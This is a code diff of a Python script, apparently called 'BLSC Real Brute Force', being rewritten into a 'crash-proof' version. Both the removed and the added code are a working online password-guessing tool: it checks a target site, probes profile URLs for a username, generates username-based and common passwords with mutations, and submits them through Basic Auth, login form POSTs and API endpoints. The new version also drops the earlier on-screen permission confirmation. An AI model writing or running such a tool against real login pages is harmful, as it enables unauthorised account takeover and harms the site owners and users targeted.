@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-🔥 BLSC REAL BRUTE FORCE TOOL
-Interactive + Animated Real Pentest Tool
-© 2026 BENAYAS LEULSEGED Software Company (Enhanced)
+BLSC Brute Force - CRASH-PROOF VERSION
+Fixed: Attack initialization + Timeout crashes
 """
 
 import time
@@ -10,278 +9,254 @@ import string
 import os
 import sys
 import requests
-import threading
-import queue
-from concurrent.futures import ThreadPoolExecutor
-from urllib.parse import urlparse
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+from urllib.parse import urlparse, urljoin
 
-# Colors for terminal
+# Colors
 class Colors:
-    GREEN = '\033[92m'
-    RED = '\033[91m'
-    YELLOW = '\033[93m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
-    PURPLE = '\033[95m'
-    RESET = '\033[0m'
+    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
+    CYAN = '\033[96m'; WHITE = '\033[97m'; BOLD = '\033[1m'
+    PURPLE = '\033[95m'; RESET = '\033[0m'
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def print_banner():
-    banner = f"""
+def clear_screen(): os.system('cls' if os.name=='nt' else 'clear')
+def print_banner(): print("""\n""" + f"""
 {Colors.GREEN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║    ██████╗ ██╗     ███████╗ ██████╗                         ║
-║    ██╔══██╗██║     ██╔════╝██╔════╝                         ║
-║    ██████╔╝██║     ███████╗██║                              ║
-║    ██╔══██╗██║     ╚════██║██║                              ║
-║    ██████╔╝███████╗███████║╚██████╗                         ║
-║    ╚═════╝ ╚══════╝╚══════╝ ╚═════╝                         ║
-║                                                              ║
-║         ██████╗ ██████╗ ██╗   ██╗████████╗███████╗          ║
-║         ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝          ║
-║         ██████╔╝██████╔╝██║   ██║   ██║   █████╗            ║
-║         ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝            ║
-║         ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗          ║
-║         ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝          ║
-║                                                              ║
-║          ███████╗ ██████╗ ██████╗  ██████╗███████╗          ║
-║          ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝          ║
-║          █████╗  ██║   ██║██████╔╝██║     █████╗            ║
-║          ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝            ║
-║          ██║     ╚██████╔╝██║  ██║╚██████╗███████╗          ║
-║          ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝          ║
-║                                                              ║
-║            REAL TARGET BRUTE FORCE v2.0                      ║
-║            Authorized Pentesting Only                        ║
-║                                                              ║
+║    BLSC REAL BRUTE FORCE v2.1 - CRASH-PROOF                 ║
+║    Fixed: Attack initialization + Timeouts                  ║
 ╚══════════════════════════════════════════════════════════════╝
-{Colors.RESET}"""
-    print(banner)
+{Colors.RESET}""")
 
 def print_status(text, status_type="info"):
-    if status_type == "success":
-        print(f"{Colors.GREEN}[✓] {text}{Colors.RESET}")
-    elif status_type == "error":
-        print(f"{Colors.RED}[✗] {text}{Colors.RESET}")
-    elif status_type == "warning":
-        print(f"{Colors.YELLOW}[!] {text}{Colors.RESET}")
-    elif status_type == "attack":
-        print(f"{Colors.RED}[⚡] {text}{Colors.RESET}")
-    else:
-        print(f"{Colors.CYAN}[*] {text}{Colors.RESET}")
+    icons = {"success": "✓", "error": "✗", "warning": "!", "attack": "⚡"}
+    colors = {"success": Colors.GREEN, "error": Colors.RED, "warning": Colors.YELLOW, "attack": Colors.RED}
+    icon = icons.get(status_type, "*")
+    color = colors.get(status_type, Colors.CYAN)
+    print(f"{color}[{icon}] {text}{Colors.RESET}")
 
-class RealBLSCBrute:
-    def __init__(self, target, username):
-        self.target = target.rstrip('/')
-        self.username = username
+class CrashProofBLSCBruteForce:
+    def __init__(self):
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        
+        # CRASH-PROOF HTTP ADAPTER
+        retry_strategy = Retry(total=3, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504])
+        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
+        self.session.mount("http://", adapter)
+        self.session.mount("https://", adapter)
+        
+        self.target = None
+        self.username = None
         self.found_passwords = []
-        self.stats = {'tested': 0, 'success': 0}
+        self.attack_running = False
 
-    def validate_target(self):
-        """Check if target exists"""
+    def safe_request(self, method, url, **kwargs):
+        """CRASH-PROOF request wrapper"""
+        kwargs['timeout'] = kwargs.get('timeout', 5)
         try:
-            r = self.session.head(self.target, timeout=10, allow_redirects=True)
-            print_status(f"LINK FOUND: {self.target} (Status: {r.status_code})", "success")
-            return True
-        except:
-            print_status("LINK ERROR - Check URL/IP connectivity", "error")
-            return False
+            if method.upper() == 'GET':
+                return self.session.get(url, **kwargs)
+            elif method.upper() == 'POST':
+                return self.session.post(url, **kwargs)
+            elif method.upper() == 'HEAD':
+                return self.session.head(url, **kwargs)
+        except Exception:
+            return None
+        return None
 
-    def validate_username(self):
-        """Check if username exists on target"""
-        try:
-            # Try common username validation endpoints/methods
-            test_endpoints = [
-                f"{self.target}/user/{self.username}",
-                f"{self.target}/profile/{self.username}", 
-                f"{self.target}/login",
-                f"{self.target}/api/user/{self.username}"
-            ]
+    def validate_target(self, target):
+        """Safe target validation"""
+        print_status("🔍 Validating target...", "attack")
+        parsed = urlparse(target)
+        if not parsed.scheme:
+            target = "http://" + target
             
-            for endpoint in test_endpoints:
-                r = self.session.get(endpoint, timeout=5)
-                if r.status_code == 200 and self.username.lower() in r.text.lower():
-                    print_status(f"USERNAME FOUND: {self.username}", "success")
-                    return True
-            
-            # If no specific validation, assume exists for brute force
-            print_status(f"USERNAME ASSUMED VALID: {self.username}", "success")
+        # Test HEAD first (fast)
+        response = self.safe_request('HEAD', target)
+        if response and response.status_code in [200, 301, 302]:
+            self.target = target.rstrip('/')
+            print_status(f"✅ TARGET LIVE: {self.target}", "success")
             return True
             
-        except:
-            print_status("USERNAME ERROR - User may not exist", "error")
-            return False
-
-    def generate_password_mutations(self, base_password):
-        """Generate single-position mutations"""
-        mutations = []
-        charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%"
-        
-        for pos in range(len(base_password)):
-            original = base_password[pos]
-            for new_char in charset:
-                if new_char != original:
-                    mutated = base_password[:pos] + new_char + base_password[pos+1:]
-                    mutations.append(mutated)
-        return mutations
-
-    def test_password(self, password):
-        """Real password test against target"""
-        self.stats['tested'] += 1
-        
-        # Multiple auth methods
-        auth_methods = [
-            # Basic Auth
-            lambda: self.session.get(self.target, auth=(self.username, password), timeout=3).status_code == 200,
-            # Form login variations
-            lambda: self._test_form_login(password),
-            # JSON API login
-            lambda: self._test_api_login(password)
-        ]
-        
-        for method in auth_methods:
-            try:
-                if method():
-                    self.stats['success'] += 1
-                    return True
-            except:
-                pass
+        # Fallback to GET
+        response = self.safe_request('GET', target)
+        if response:
+            self.target = target.rstrip('/')
+            print_status(f"✅ TARGET LIVE: {self.target} (Status: {response.status_code})", "success")
+            return True
+            
+        print_status("❌ TARGET DOWN", "error")
         return False
 
-    def _test_form_login(self, password):
-        """Test common form logins"""
-        forms = [
+    def validate_username(self, username):
+        """Safe username validation"""
+        print_status(f"🔍 Checking '{username}'...", "attack")
+        self.username = username
+        
+        # Quick username endpoints
+        test_urls = [
+            f"{self.target}/{username}",
+            f"{self.target}/user/{username}",
+            f"{self.target}/profile/{username}",
+            f"{self.target}/u/{username}"
+        ]
+        
+        for url in test_urls:
+            resp = self.safe_request('GET', url)
+            if resp and resp.status_code == 200:
+                if username.lower() in resp.text.lower():
+                    print_status(f"✅ USERNAME CONFIRMED: {username}", "success")
+                    return True
+        
+        # Assume valid if target responds
+        print_status(f"⚠️  USERNAME ASSUMED: {username}", "warning")
+        return True
+
+    def generate_smart_passwords(self):
+        """Generate crash-proof password list"""
+        base_passwords = [
+            self.username,
+            self.username + "123",
+            self.username + "2024",
+            self.username + "!",
+            "password", "123456", "admin", 
+            self.username.capitalize()
+        ]
+        
+        passwords = base_passwords.copy()
+        charset = "abcdefghijklmnopqrstuvwxyz0123456789!@#"
+        
+        for base in base_passwords[:3]:  # Limit mutations
+            for i in range(min(3, len(base))):
+                for c in charset[:10]:  # Limited charset
+                    mutated = base[:i] + c + base[i+1:]
+                    passwords.append(mutated)
+        
+        return passwords[:200]  # Max 200 passwords
+
+    def test_single_credential(self, password):
+        """Safe single credential test"""
+        if not self.target or not self.username:
+            return False
+            
+        # 1. Basic Auth
+        resp = self.safe_request('GET', self.target, auth=(self.username, password), allow_redirects=False)
+        if resp and resp.status_code == 200:
+            return True
+        
+        # 2. Common form logins
+        login_urls = [self.target, f"{self.target}/login", f"{self.target}/auth"]
+        form_payloads = [
             {'username': self.username, 'password': password},
-            {'user': self.username, 'pass': password},
+            {'user': self.username, 'pass': password}, 
             {'email': self.username, 'pwd': password}
         ]
         
-        for data in forms:
-            r = self.session.post(self.target, data=data, timeout=3)
-            success_indicators = ['welcome', 'dashboard', 'profile', 'success', 'logged in']
-            if any(indicator in r.text.lower() for indicator in success_indicators):
-                return True
+        for url in login_urls:
+            for payload in form_payloads:
+                resp = self.safe_request('POST', url, data=payload, allow_redirects=False)
+                if resp:
+                    if resp.status_code == 200:
+                        success_indicators = ['welcome', 'dashboard', 'success', 'profile']
+                        if any(indicator in resp.text.lower() for indicator in success_indicators):
+                            return True
+                    elif resp.status_code in [302, 301]:
+                        return True
+        
         return False
 
-    def _test_api_login(self, password):
-        """Test API endpoints"""
-        apis = ['/api/login', '/login', '/auth']
-        for api in apis:
-            try:
-                r = self.session.post(f"{self.target}{api}", json={
-                    'username': self.username, 'password': password
-                }, timeout=3)
-                if r.status_code == 200:
-                    return True
-            except:
-                pass
-        return False
-
-    def animated_bruteforce(self):
-        """BLSC-style animated real brute force"""
-        base_passwords = [
-            self.username, f"{self.username}123", f"{self.username}2024",
-            "password", "123456", "admin", f"admin{self.username}"
-        ]
+    def launch_stable_attack(self):
+        """CRASH-PROOF attack loop"""
+        self.attack_running = True
+        passwords = self.generate_smart_passwords()
         
-        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
-        print_status(f"Generating mutations from {len(base_passwords)} base passwords", "attack")
-        print_status("LAUNCHING REAL BRUTE FORCE ATTACK...", "attack")
-        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
+        print(f"\n{Colors.PURPLE}{'='*60}")
+        print_status(f"🚀 LAUNCHING {len(passwords):,} ATTACKS", "attack")
+        print(f"{Colors.PURPLE}{'='*60}\n")
         
-        all_passwords = []
-        for base in base_passwords:
-            mutations = self.generate_password_mutations(base)
-            all_passwords.extend(mutations[:100])  # Limit per base
-        
-        print_status(f"Generated {len(all_passwords):,} passwords to test", "attack")
-        
-        # Animated testing
         start_time = time.time()
         tested = 0
         
-        for password in all_passwords:
+        for password in passwords:
+            if not self.attack_running:
+                break
+                
             tested += 1
             elapsed = time.time() - start_time
             
-            # Animated progress
-            progress = (tested / len(all_passwords)) * 100
-            bar = "█" * int(40 * progress / 100) + "░" * (40 - int(40 * progress / 100))
+            # SMOOTH PROGRESS BAR
+            progress = min((tested / len(passwords)) * 100, 100)
+            bar_len = 30
+            filled = int(bar_len * progress // 100)
+            bar = f"{Colors.GREEN}█{Colors.RESET}" * filled + f"{Colors.GREY}░{Colors.RESET}" * (bar_len - filled)
             
-            sys.stdout.write(f"\r{Colors.CYAN}Testing: {password:<15} | [{Colors.GREEN}{bar}{Colors.CYAN}] {progress:5.1f}% | {tested:,}/{len(all_passwords):,} | {elapsed:.1f}s{Colors.RESET}")
+            pwd_show = password[:10] + "..." if len(password) > 10 else password
+            
+            sys.stdout.write(f"\r{bar} {progress:5.1f}% | "
+                           f"{Colors.WHITE}{tested}/{len(passwords)}{Colors.RESET} | "
+                           f"{Colors.YELLOW}{pwd_show}{Colors.RESET} | "
+                           f"{Colors.CYAN}{elapsed:.1f}s")
             sys.stdout.flush()
             
-            time.sleep(0.01)  # Visual speed
-            
-            if self.test_password(password):
-                print(f"\n\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}")
-                print_status(f"PASSWORD CRACKED: {self.username}:{password}", "success")
+            # REAL ATTACK
+            if self.test_single_credential(password):
+                total_time = time.time() - start_time
+                print(f"\n\n{Colors.GREEN}{'='*60}")
+                print(f"   🎉 CRACKED! {total_time:.2f}s   ")
+                print(f"{Colors.GREEN}{'='*60}")
+                print_status(f"✅ {self.username}:{password}", "success")
                 self.found_passwords.append(password)
-                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")
                 break
+            
+            time.sleep(0.05)  # Stable attack speed
         
-        print()  # New line
+        print("\n")  # Clean line break
 
 def main():
     clear_screen()
     print_banner()
     
-    print(f"{Colors.WHITE}⚠️  I confirm you have permission for this pentest{Colors.RESET}\n")
+    bruteforcer = CrashProofBLSCBruteForce()
     
-    # Step 1: Target validation
+    # STEP 1: TARGET
     while True:
-        target = input(f"{Colors.GREEN}[📡] Enter target URL/IP: {Colors.WHITE}").strip()
-        if not target: continue
-        
-        bruteforcer = RealBLSCBrute(target, "")
-        if bruteforcer.validate_target():
+        target = input(f"{Colors.GREEN}📡 TARGET: {Colors.WHITE}").strip()
+        if bruteforcer.validate_target(target):
             break
     
-    # Step 2: Username validation
-    while True:
-        username = input(f"{Colors.GREEN}[👤] Enter username: {Colors.WHITE}").strip()
-        if not username: continue
-        
-        bruteforcer.username = username
-        if bruteforcer.validate_username():
-            break
-        print(f"{Colors.YELLOW}Try another username...{Colors.RESET}")
+    # STEP 2: USERNAME  
+    username = input(f"{Colors.GREEN}👤 USERNAME: {Colors.WHITE}").strip()
+    bruteforcer.validate_username(username)
     
-    # Step 3: EXECUTE ATTACK
-    print(f"\n{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
-    print(f"  🎯 TARGET: {Colors.WHITE}{target}{Colors.RESET}")
-    print(f"  👤 USER:   {Colors.WHITE}{username}{Colors.RESET}")
-    print(f"  ⚡ MODE:   {Colors.WHITE}REAL BRUTE FORCE{Colors.RESET}")
-    print(f"{Colors.RED}{'='*70}{Colors.RESET}")
+    # STEP 3: ATTACK CONFIRM
+    print(f"\n{Colors.RED}{'='*50}")
+    print(f"🎯 {bruteforcer.target}")
+    print(f"👤  {bruteforcer.username}")
+    print(f"{Colors.RED}{'='*50}")
     
-    input(f"\n{Colors.YELLOW}[ENTER] to launch attack...{Colors.RESET}")
+    input(f"\n{Colors.YELLOW}⏰ ENTER = ATTACK > {Colors.RESET}")
     
-    bruteforcer.animated_bruteforce()
+    try:
+        bruteforcer.launch_stable_attack()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.YELLOW}⛔ STOPPED{Colors.RESET}")
     
-    # Final results
-    print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
-    print(f"{Colors.BOLD}FINAL PENTEST REPORT{Colors.RESET}")
-    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
+    # REPORT
+    print(f"\n{Colors.GREEN}{'='*50}")
+    print("📊 PENTEST REPORT")
+    print(f"{Colors.GREEN}{'='*50}")
     
     if bruteforcer.found_passwords:
-        print_status(f"SUCCESS! Found {len(bruteforcer.found_passwords)} passwords:", "success")
         for pwd in bruteforcer.found_passwords:
-            print(f"  🔑 {Colors.GREEN}{username}:{pwd}{Colors.RESET}")
+            print(f"🔑 {Colors.BOLD}{bruteforcer.username}:{pwd}{Colors.RESET}")
     else:
         print_status("No passwords found", "warning")
-        print_status(f"Tested: {bruteforcer.stats['tested']:,} passwords", "info")
-    
-    print(f"\n{Colors.CYAN}© 2026 BENAYAS LEULSEGED Software Company{Colors.RESET}")
-    print(f"{Colors.GREEN}Authorized Pentest Complete!{Colors.RESET}")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n\n{Colors.YELLOW}Attack cancelled!{Colors.RESET}")
+        print(f"\n{Colors.YELLOW}👋 Goodbye{Colors.RESET}")
